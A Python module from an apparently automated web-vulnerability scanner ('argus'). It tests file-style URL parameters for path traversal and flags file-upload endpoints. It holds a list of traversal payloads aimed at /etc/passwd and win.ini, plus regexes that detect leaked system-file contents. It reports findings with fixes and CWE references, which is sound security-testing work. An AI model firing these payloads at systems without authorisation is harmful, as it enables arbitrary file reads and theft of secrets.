"""FileAttacker — path traversal in file parameters (and upload-surface flagging).

Injects directory-traversal sequences into file/path-style parameters and looks for
the signatures of well-known system files (/etc/passwd, Windows win.ini) in the
response. Upload endpoints discovered during recon are flagged for targeted upload
bypass testing (full multipart upload fuzzing is a follow-up).
"""

from __future__ import annotations

import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from argus.agents.base import AgentReport, AttackContext, BaseAgent, Endpoint, build_http_poc
from argus.models import Finding, Severity

_FILE_PARAM = re.compile(r"(?i)\b(file|path|filename|doc|document|download|attachment|template|page|name|load|read|dir)\b")

_TRAVERSALS = [
    "../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "../../../../../../windows/win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
]
_SIGS = re.compile(r"(root:.*:0:0:|\[fonts\]|\[extensions\]|; for 16-bit app support)", re.IGNORECASE)
_UPLOAD_HINT = re.compile(r"(?i)\b(upload|import|attach|avatar|media)\b")


def _with_param(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    qs[param] = [value]
    new_q = urlencode({k: v[0] for k, v in qs.items()})
    return urlunparse(parsed._replace(query=new_q))


class FileAttacker(BaseAgent):
    name = "FileAttacker"
    description = "upload & traversal"

    async def run(self, ctx: AttackContext) -> AgentReport:
        report = AgentReport(agent=self.name, status="running")
        targets, uploads = self._targets(ctx)

        flagged: set[str] = set()
        for ep, param in targets:
            sig = f"{ep.url}::{param}"
            if sig in flagged:
                continue
            ctx.emit(self.name, f"traversal test on {param} @ {self._short(ep.url)} …")
            for payload in _TRAVERSALS:
                resp = await self.get(ctx, _with_param(ep.url, param, payload))
                if resp is not None and resp.status_code < 400 and _SIGS.search(resp.text or ""):
                    flagged.add(sig)
                    ctx.report(Finding(
                        title="Path traversal (arbitrary file read)",
                        severity=Severity.HIGH,
                        category="file",
                        detector="fileattacker:traversal",
                        endpoint=f"{ep.method} {ep.url}",
                        evidence=f"param '{param}' + traversal returned system-file contents",
                        description=f"The '{param}' parameter is used to build a file path without "
                                    f"normalisation, allowing reads outside the intended directory.",
                        exploit="Read /etc/passwd, source code, secrets or config files.",
                        fix="Normalise the resolved path and verify it stays within an allowed base dir; "
                            "use an allow-list of filenames.",
                        cwe="CWE-22",
                        cvss=7.5,
                        confidence="high",
                        poc=build_http_poc(ep.method, _with_param(ep.url, param, payload), resp),
                    ))
                    break

        for url in uploads:
            ctx.report(Finding(
                title="File upload endpoint (review upload validation)",
                severity=Severity.INFO,
                category="file",
                detector="fileattacker:upload",
                endpoint=url,
                evidence=f"upload-like endpoint discovered: {url}",
                description="A file-upload endpoint was found. Verify it validates magic bytes (not just "
                            "Content-Type/extension), stores outside the web root, and randomises names.",
                fix="Validate file type by content, store outside web root, randomise names, cap size.",
                cwe="CWE-434",
                confidence="low",
            ))

        report.requests_sent = ctx.requests_sent
        report.findings = len([f for f in ctx.findings if f.detector.startswith("fileattacker")])
        report.status = "complete"
        ctx.emit(self.name, f"sweep complete — {len(flagged)} traversal(s)", "ok")
        return report

    def _targets(self, ctx: AttackContext) -> tuple[list[tuple[Endpoint, str]], list[str]]:
        out: list[tuple[Endpoint, str]] = []
        uploads: list[str] = []
        for ep in ctx.endpoint_list():
            if _UPLOAD_HINT.search(ep.url):
                uploads.append(ep.url)
            if ep.method != "GET":
                continue
            for p in ep.params:
                if _FILE_PARAM.search(p):
                    out.append((ep, p))
        return out[:30], uploads[:5]

    @staticmethod
    def _short(url: str) -> str:
        p = urlparse(url)
        return (p.path or "/") + ("?" + p.query if p.query else "")
